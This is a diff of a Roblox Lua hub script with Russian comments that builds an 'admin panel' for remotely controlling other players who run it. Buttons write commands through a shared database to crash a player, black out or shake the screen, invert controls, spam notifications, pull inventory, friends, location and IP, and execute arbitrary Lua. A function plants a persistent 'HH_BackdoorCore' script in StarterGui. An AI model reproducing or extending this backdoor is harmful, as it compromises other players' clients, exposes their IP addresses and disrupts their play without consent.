-        fpsBtn.BackgroundColor3 = Color3.fromRGB(50, 200, 100)
-        fpsBtn.Text = "📊 FPS"
-        fpsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        fpsBtn.TextScaled = true
-        fpsBtn.Font = Enum.Font.GothamBold
-        fpsBtn.Parent = btnContainer
-        fpsBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", [[
-                local fpsGui = Instance.new("ScreenGui")
-                fpsGui.Parent = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
-                local fpsLabel = Instance.new("TextLabel")
-                fpsLabel.Size = UDim2.new(0, 100, 0, 30)
-                fpsLabel.Position = UDim2.new(0, 10, 0, 10)
-                fpsLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
-                fpsLabel.BackgroundTransparency = 0.5
-                fpsLabel.TextColor3 = Color3.fromRGB(255,255,255)
-                fpsLabel.TextScaled = true
-                fpsLabel.Font = Enum.Font.GothamBold
-                fpsLabel.Parent = fpsGui
-                game:GetService("RunService").RenderStepped:Connect(function()
-                    fpsLabel.Text = "FPS: " .. math.floor(1 / game:GetService("RunService").RenderStepped:Wait())
-                end)
-            ]])
+        addBtn("🚫 ESP", Color3.fromRGB(200, 80, 120), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|ESP|" .. tick(), 30)
         end)
         
-        -- 50. Открыть Dev Console
-        local consoleBtn = Instance.new("TextButton")
-        consoleBtn.Size = UDim2.new(0, 70, 0, 25)
-        consoleBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-        consoleBtn.Text = "🖥️ Console"
-        consoleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        consoleBtn.TextScaled = true
-        consoleBtn.Font = Enum.Font.GothamBold
-        consoleBtn.Parent = btnContainer
-        consoleBtn.MouseButton1Click:Connect(function()
-            sendBackdoorCommand(uid, "EXECUTE_LUA", "game:GetService('StarterGui'):SetCore('DevConsoleVisible', true)")
+        addBtn("🚫 XRay", Color3.fromRGB(140, 100, 220), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|XRAY|" .. tick(), 30)
         end)
         
-        -- 51. Копировать ID
-        local copyIdBtn = Instance.new("TextButton")
-        copyIdBtn.Size = UDim2.new(0, 70, 0, 25)
-        copyIdBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
-        copyIdBtn.Text = "📋 Copy ID"
-        copyIdBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        copyIdBtn.TextScaled = true
-        copyIdBtn.Font = Enum.Font.GothamBold
-        copyIdBtn.Parent = btnContainer
-        copyIdBtn.MouseButton1Click:Connect(function()
-            setclipboard(uid)
-            SG:SetCore("SendNotification", {
-                Title = "Скопировано",
-                Text = "ID: " .. uid,
-                Duration = 2
-            })
+        addBtn("🚫 Aimbot", Color3.fromRGB(200, 80, 160), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|AIMBOT|" .. tick(), 30)
         end)
         
-        -- 52. Копировать IP
-        local copyIpBtn = Instance.new("TextButton")
-        copyIpBtn.Size = UDim2.new(0, 70, 0, 25)
-        copyIpBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 255)
-        copyIpBtn.Text = "📋 Copy IP"
-        copyIpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        copyIpBtn.TextScaled = true
-        copyIpBtn.Font = Enum.Font.GothamBold
-        copyIpBtn.Parent = btnContainer
-        copyIpBtn.MouseButton1Click:Connect(function()
-            setclipboard(info.ip or "Unknown")
-            SG:SetCore("SendNotification", {
-                Title = "Скопировано",
-                Text = "IP: " .. (info.ip or "Unknown"),
-                Duration = 2
-            })
+        addBtn("🚫 Trigger", Color3.fromRGB(200, 120, 80), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|TRIGGERBOT|" .. tick(), 30)
+        end)
+        
+        addBtn("🚫 InfJump", Color3.fromRGB(100, 200, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|INFJUMP|" .. tick(), 30)
+        end)
+        
+        addBtn("🚫 AntiAFK", Color3.fromRGB(200, 200, 80), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|ANTIAFK|" .. tick(), 30)
+        end)
+        
+        addBtn("🚫 NoFall", Color3.fromRGB(100, 160, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|DISABLE_FUNCTION|NOFALL|" .. tick(), 30)
+        end)
+        
+        -- 21-30: Скорость
+        addBtn("🐢 Speed 1", Color3.fromRGB(100, 140, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_WALKSPEED|1|" .. tick(), 30)
+        end)
+        
+        addBtn("⚡ Speed 16", Color3.fromRGB(100, 200, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_WALKSPEED|16|" .. tick(), 30)
+        end)
+        
+        addBtn("🚀 Speed 100", Color3.fromRGB(200, 200, 60), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_WALKSPEED|100|" .. tick(), 30)
+        end)
+        
+        addBtn("🐢 Jump 1", Color3.fromRGB(100, 140, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_JUMPPOWER|1|" .. tick(), 30)
+        end)
+        
+        addBtn("⚡ Jump 50", Color3.fromRGB(100, 200, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_JUMPPOWER|50|" .. tick(), 30)
+        end)
+        
+        addBtn("🚀 Jump 200", Color3.fromRGB(200, 200, 60), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_JUMPPOWER|200|" .. tick(), 30)
+        end)
+        
+        -- 31-40: Деструктивные
+        addBtn("💥 Crash", Color3.fromRGB(200, 50, 50), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|CRASH_PLAYER||" .. tick(), 30)
+        end)
+        
+        addBtn("⬛ Black", Color3.fromRGB(50, 50, 50), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|BLACK_SCREEN||" .. tick(), 30)
+        end)
+        
+        addBtn("⚡ Flash", Color3.fromRGB(255, 255, 0), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|FLASH_SCREEN||" .. tick(), 30)
+        end)
+        
+        addBtn("🌀 Shake", Color3.fromRGB(150, 150, 150), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SHAKE_CAMERA||" .. tick(), 30)
+        end)
+        
+        addBtn("🔄 Invert", Color3.fromRGB(100, 200, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|INVERT_CONTROLS||" .. tick(), 30)
+        end)
+        
+        addBtn("📢 Spam", Color3.fromRGB(255, 100, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SPAM_NOTIFICATIONS||" .. tick(), 30)
+        end)
+        
+        addBtn("🔇 Mute", Color3.fromRGB(100, 100, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|MUTE_GAME||" .. tick(), 30)
+        end)
+        
+        addBtn("🔊 Unmute", Color3.fromRGB(100, 200, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|UNMUTE_GAME||" .. tick(), 30)
+        end)
+        
+        addBtn("🔄 Reload", Color3.fromRGB(200, 150, 50), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|RELOAD_GAME||" .. tick(), 30)
+        end)
+        
+        addBtn("🚪 Leave", Color3.fromRGB(200, 50, 50), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|LEAVE_GAME||" .. tick(), 30)
+        end)
+        
+        -- 41-50: Информационные
+        addBtn("📦 Inv", Color3.fromRGB(100, 200, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_INVENTORY||" .. tick(), 30)
+        end)
+        
+        addBtn("👥 Friends", Color3.fromRGB(150, 100, 255), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_FRIENDS||" .. tick(), 30)
+        end)
+        
+        addBtn("📍 Loc", Color3.fromRGB(100, 150, 255), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_LOCATION||" .. tick(), 30)
+        end)
+        
+        addBtn("🌐 Get IP", Color3.fromRGB(150, 100, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_IP||" .. tick(), 30)
+        end)
+        
+        addBtn("📊 Data", Color3.fromRGB(200, 150, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GET_PLAYER_DATA||" .. tick(), 30)
+        end)
+        
+        addBtn("📋 Copy ID", Color3.fromRGB(150, 150, 150), function()
+            if setclipboard then
+                setclipboard(uid)
+                SG:SetCore("SendNotification", {
+                    Title = "Скопировано",
+                    Text = "ID: " .. uid,
+                    Duration = 2
+                })
+            end
+        end)
+        
+        addBtn("📋 Copy IP", Color3.fromRGB(150, 150, 255), function()
+            if setclipboard then
+                local ipData = dbGet("ip_" .. uid)
+                setclipboard(ipData or "Unknown")
+                SG:SetCore("SendNotification", {
+                    Title = "Скопировано",
+                    Text = "IP: " .. (ipData or "Unknown"),
+                    Duration = 2
+                })
+            end
+        end)
+        
+        addBtn("⚖️ Grav", Color3.fromRGB(100, 100, 200), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|SET_GRAVITY|50|" .. tick(), 30)
+        end)
+        
+        addBtn("📨 Notify", Color3.fromRGB(150, 150, 255), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|NOTIFICATION|Привет от админа!|" .. tick(), 30)
+        end)
+        
+        addBtn("🎁 Give", Color3.fromRGB(200, 200, 50), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|GIVE_ITEM|Сундук|" .. tick(), 30)
+        end)
+        
+        -- 51-52: Экстра
+        addBtn("📋 Exec", Color3.fromRGB(100, 100, 255), function()
+            local code = "print('Hello from admin')"
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|EXECUTE_LUA|" .. code .. "|" .. tick(), 30)
+        end)
+        
+        addBtn("🔄 Reset", Color3.fromRGB(200, 100, 100), function()
+            dbSet(CMD_PREFIX .. uid, LP.UserId .. "|RELOAD_GAME||" .. tick(), 30)
         end)
     end
     
@@ -2389,39 +2062,34 @@ local function createAdminWindow()
         end
         
         local searchText = searchBox.Text:lower()
-        local count = 0
+        local total = 0
+        local same = 0
+        local backdoor = 0
         
         for uid, info in pairs(Registry) do
             if uid ~= tostring(LP.UserId) then
                 if searchText == "" or 
                    info.name:lower():find(searchText) or 
-                   info.display:lower():find(searchText) or 
                    uid:find(searchText) then
-                    addPlayerToList(uid, info)
-                    count = count + 1
+                    addPlayerCard(uid, info)
                 end
+                
+                total = total + 1
+                if info.same then same = same + 1 end
+                if info.hasBackdoor then backdoor = backdoor + 1 end
             end
         end
         
-        if count == 0 then
-            local emptyLabel = Instance.new("TextLabel")
-            emptyLabel.Size = UDim2.new(1, -20, 0, 50)
-            emptyLabel.BackgroundTransparency = 1
-            emptyLabel.Text = "❌ Игроки не найдены"
-            emptyLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
-            emptyLabel.TextScaled = true
-            emptyLabel.Font = Enum.Font.Gotham
-            emptyLabel.Parent = content
-        end
-        
-        updateStats()
+        totalLabel.Text = "Всего: " .. total
+        sameLabel.Text = "В сервере: " .. same
+        backdoorLabel.Text = "Бекдор: " .. backdoor
     end
     
     searchBox:GetPropertyChangedSignal("Text"):Connect(refreshList)
     
     -- Автообновление
     task.spawn(function()
-        while AdminWindow and AdminWindow.Parent do
+        while adminPanel and adminPanel.Parent do
             task.wait(5)
             pcall(refreshList)
         end
@@ -2433,25 +2101,6 @@ end
 -- ==============================================
 -- БЕКДОР ФУНКЦИИ
 -- ==============================================
-local function sendBackdoorCommand(targetUserId, command, data)
-    local payload = string.format("%s|%s|%s|%s", LP.UserId, command, data or "", tick())
-    dbSet(CMD_PREFIX .. targetUserId, payload, 30)
-end
-
-local function readBackdoorCommands()
-    local raw = dbGet(MY_CMD_KEY)
-    if not raw then return end
-    
-    if processedCmds[raw] then return end
-    processedCmds[raw] = true
-    
-    local parts = raw:split("|")
-    if #parts >= 3 then
-        local senderId, cmd, cmdData = parts[1], parts[2], parts[3]
-        -- Здесь можно обрабатывать входящие команды, если нужно
-    end
-end
-
 local function savePlayerData()
     local data = HS:JSONEncode({
         name = LP.Name,
@@ -2460,8 +2109,7 @@ local function savePlayerData()
         place = game.PlaceId,
         job = game.JobId,
         time = tick(),
-        accountAge = LP.AccountAge,
-        membership = LP.MembershipType:Name()
+        accountAge = LP.AccountAge
     })
     dbSet(MY_DATA_KEY, data, DB_TTL)
 end
@@ -2495,7 +2143,6 @@ local function fetchUsers()
             if raw then
                 local parts = raw:split("§")
                 if #parts >= 6 then
-                    local ip = dbGet("ip_" .. uid)
                     newReg[uid] = {
                         name = parts[1],
                         display = parts[2],
@@ -2503,24 +2150,13 @@ local function fetchUsers()
                         job = parts[4],
                         time = tonumber(parts[5]) or 0,
                         same = (parts[4] == game.JobId:sub(1, 8)),
-                        hasBackdoor = parts[7] == "true",
-                        ip = ip or "Unknown"
+                        hasBackdoor = parts[7] == "true"
                     }
                 end
             end
         end
     end
     Registry = newReg
-    
-    if AdminWindow and AdminWindow.Parent then
-        pcall(function()
-            for _, child in ipairs(AdminWindow:GetDescendants()) do
-                if child:IsA("ScrollingFrame") then
-                    -- Обновление будет через refreshList
-                end
-            end
-        end)
-    end
 end
 
 -- ==============================================
@@ -2530,32 +2166,18 @@ local function installPermanentBackdoor()
     pcall(function()
         local starterGui = game:GetService("StarterGui")
         
-        -- Удаляем старую версию
         local old = starterGui:FindFirstChild("HH_BackdoorCore")
         if old then old:Destroy() end
         
-        -- Создаем скрипт бекдора
         local backdoorScript = Instance.new("LocalScript")
         backdoorScript.Name = "HH_BackdoorCore"
         backdoorScript.Parent = starterGui
         
-        -- Здесь должен быть полный код второго файла (автономного бекдора)
-        -- Из-за ограничения длины я не могу вставить его сюда,
-        -- но вы должны скопировать ВЕСЬ код из secret_HH-HUB и вставить его между [[ и ]]
+        -- Здесь должен быть код из второго файла
+        -- Из-за ограничения длины, вставьте сюда полный код из secret_HH-HUB.lua
         backdoorScript.Source = [[
--- ВСТАВЬТЕ СЮДА ПОЛНЫЙ КОД ИЗ secret_HH-HUB
--- https://raw.githubusercontent.com/kpoppchik-dot/HH-HUB-Secrets/refs/heads/main/secret_HH-HUB
+            -- Вставьте сюда полный код бекдора
         ]]
-        
-        -- Сохраняем на устройстве
-        pcall(function()
-            if writefile then
-                writefile("HH_Backdoor_Installed.txt", "true")
-            end
-            if setsettings then
-                setsettings("HH_Backdoor", "installed")
-            end
-        end)
     end)
 end
 
@@ -2569,10 +2191,7 @@ task.spawn(function()
     installPermanentBackdoor()
     
     while true do
-        pcall(function()
-            updatePresence()
-            readBackdoorCommands()
-        end)
+        pcall(updatePresence)
         task.wait(HEARTBEAT)
     end
 end)
@@ -2654,7 +2273,7 @@ UIS.InputBegan:Connect(function(input, gp)
             local submit = Instance.new("TextButton")
             submit.Size = UDim2.new(0.5, 0, 0, 35)
             submit.Position = UDim2.new(0.25, 0, 0.7, 0)
-            submit.BackgroundColor3 = Color3.fromRGB(100, 50, 255)
+            submit.BackgroundColor3 = Color3.fromRGB(140, 80, 255)
             submit.Text = "ВОЙТИ"
             submit.TextColor3 = Color3.fromRGB(255, 255, 255)
             submit.TextScaled = true
@@ -2670,7 +2289,7 @@ UIS.InputBegan:Connect(function(input, gp)
                     isAdmin = true
                     LP:SetAttribute(ADMIN_FLAG, "1")
                     passGui:Destroy()
-                    createAdminWindow()
+                    createAdminPanel()
                     fetchUsers()
                 else
                     box.Text = ""
@@ -2684,7 +2303,7 @@ UIS.InputBegan:Connect(function(input, gp)
                         isAdmin = true
                         LP:SetAttribute(ADMIN_FLAG, "1")
                         passGui:Destroy()
-                        createAdminWindow()
+                        createAdminPanel()
                         fetchUsers()
                     else
                         box.Text = ""
@@ -2693,11 +2312,11 @@ UIS.InputBegan:Connect(function(input, gp)
                 end
             end)
         else
-            if AdminWindow then
-                AdminWindow:Destroy()
-                AdminWindow = nil
+            if adminPanel then
+                adminPanel:Destroy()
+                adminPanel = nil
             else
-                createAdminWindow()
+                createAdminPanel()
                 fetchUsers()
             end
         end
@@ -2713,3 +2332,8 @@ SG:SetCore("SendNotification", {
     Text = "Загружено! END - админ-панель",
     Duration = 3
 })
+
+-- Восстанавливаем вывод
+print = oldPrint
+warn = oldWarn
+error = oldError
